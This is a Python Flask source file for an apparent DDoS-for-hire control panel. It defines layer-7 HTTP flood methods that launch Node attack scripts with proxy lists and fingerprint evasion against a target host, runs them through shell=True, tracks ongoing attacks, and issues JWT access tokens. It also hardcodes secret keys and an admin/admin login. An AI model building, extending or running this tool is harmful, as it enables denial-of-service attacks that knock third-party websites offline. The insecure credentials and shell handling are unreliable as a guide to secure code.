
import os
import time as time_module  
import threading
import uuid
import subprocess
import re
import jwt  
from flask import Flask, request, jsonify, session, redirect, url_for, render_template_string
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from datetime import datetime, timedelta
import socket

app = Flask(__name__)
app.secret_key = 'supersecretkey'
limiter = Limiter(get_remote_address, app=app)

def get_default_ip():
    try:
        hostname = "8.8.8.8"
        port = 80
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect((hostname, port))
            return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"

DEFAULT_HOST = get_default_ip()
DEFAULT_PORT = 1337
SECRET_KEY = 'B3RT1337Best^^'

definitions = {
    'ServerData': {'Limit': 6, 'Ongoing': 0},
    'Attacks': []
}

methods = {
    'layer7': {
        'HTTP-SCALE': {
            'Command': 'screen -dmS {attackId} node HTTP-SCALE.js {host} {host} 3 64 http.txt --redirect true --query true',
            'Type': 'layer7'
        },
        'HTTP-COSMIC': {
            'Command': 'screen -dmS {attackId} node HTTP-COSMIC.js GET {host} {time} 3 64 http.txt --http mix --full',
            'Type': 'layer7'
        },
        'HTTP-NOON': {
            'Command': 'screen -dmS {attackId} node HTTP-NOON.js --method GET --target {host} --time {time} --threads 6 --rate 90 --proxy http.txt --http 2 --full true --cookie true --fingerprint true',
            'Type': 'layer7'
        },
        'HTTP-MAJESTIC': {
            'Command': 'screen -dmS {attackId} node HTTP-MAJESTIC.js {host} {time} 90 3 GET',
            'Type': 'layer7'
        }
    }
}

def getMethod(name):
    for group in methods:
        if methods[group].get(name):
            return methods[group][name]
    return None

def replacePlaceholders(command, replacements):
    for placeholder, value in replacements.items():
        command = command.replace(placeholder, value)
    return command

def executeCommand(command):
    try:
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        raise Exception(f"Error executing command: {e}")
    return True

def extractDomain(input):
    hostPattern = r'^(?:\w+:)?\/\/([^\s\.]+\.\S{2,}|localhost[\:?\d]*)\S*$'
    ipPattern = r'^([0-9]{1,3}\.){3}[0-9]{1,3}$'
    if re.match(hostPattern, input):
        return {'out': input, 'isIp': False}
    if re.match(ipPattern, input):
        return {'out': input, 'isIp': True}
    return None

def validateParameters(port, time):
    if time < 1 or time > 1200:
        return "The time you provided is invalid. It must be between 1 and 1200 seconds."
    return None

def generate_token(expiration_minutes=15):
    expiration = datetime.utcnow() + timedelta(minutes=expiration_minutes)
    payload = {'exp': expiration, 'iat': datetime.utcnow()}
    return jwt.encode(payload, SECRET_KEY, algorithm='HS256')

def verify_token(token):
    try:
        jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
        return True
    except jwt.ExpiredSignatureError:
        return False
    except jwt.InvalidTokenError:
        return False

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == 'admin' and password == 'admin':
            session['logged_in'] = True
            return redirect(url_for('dashboard'))
        return render_template_string(login_html, error="Invalid credentials")
    return render_template_string(login_html)

@app.route('/dashboard')
def dashboard():
    if not session.get('logged_in'):
        return redirect(url_for('home'))
    return render_template_string(dashboard_html, host=DEFAULT_HOST)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('home'))

@app.route('/generate_token_admin')
def generate_token_admin():
    if not session.get('logged_in'):
        return jsonify({'error': True, 'message': 'Unauthorized'}), 401
    try:
        minutes = int(request.args.get('minutes', 15))
    except ValueError:
        minutes = 15
    token = generate_token(minutes)
    expiration = datetime.utcnow() + timedelta(minutes=minutes)
    return jsonify({
        'token': token.decode('utf-8') if isinstance(token, bytes) else token,
        'expiration': expiration.strftime('%Y-%m-%d %H:%M:%S UTC')
    })

login_html = """
<!DOCTYPE html>
<html>
<head><title>Admin Login</title></head>
<body style="background:black;color:lime;font-family:monospace;text-align:center;">
<h2>Login Admin</h2>
<form method="post">
    Username: <input name="username"><br><br>
    Password: <input name="password" type="password"><br><br>
    <button type="submit">Login</button>
</form>
{% if error %}<p style="color:red;">{{ error }}</p>{% endif %}
</body>
</html>
"""

dashboard_html = """
<!DOCTYPE html>
<html>
<head><title>Dashboard</title></head>
<body style="background:black;color:lime;font-family:monospace;text-align:center;">
<h2>Welcome Admin</h2>
<select id="expirationSelect">
    <option value="15">15 minutes</option>
    <option value="60">1 hour</option>
    <option value="1440">1 day</option>
    <option value="4320">3 days</option>
    <option value="10080">1 week</option>
    <option value="43200">1 month</option>
</select><br><br>
<button onclick="generateToken()">Generate Token</button>
<p id="tokenArea"></p>
<script>
    function generateToken() {
        const minutes = document.getElementById('expirationSelect').value;
        fetch('/generate_token_admin?minutes=' + minutes)
            .then(response => response.json())
            .then(data => {
                document.getElementById('tokenArea').innerHTML = 
                    '<b>Token:</b> ' + data.token + 
                    '<br><b>Expires:</b> ' + data.expiration;
            })
            .catch(error => {
                document.getElementById('tokenArea').innerHTML = 'Error generating token.';
            });
    }
</script>
<br><a href="/logout" style="color:red;">Logout</a>
</body>
</html>
"""

if __name__ == '__main__':
    app.run(host=DEFAULT_HOST, port=DEFAULT_PORT)
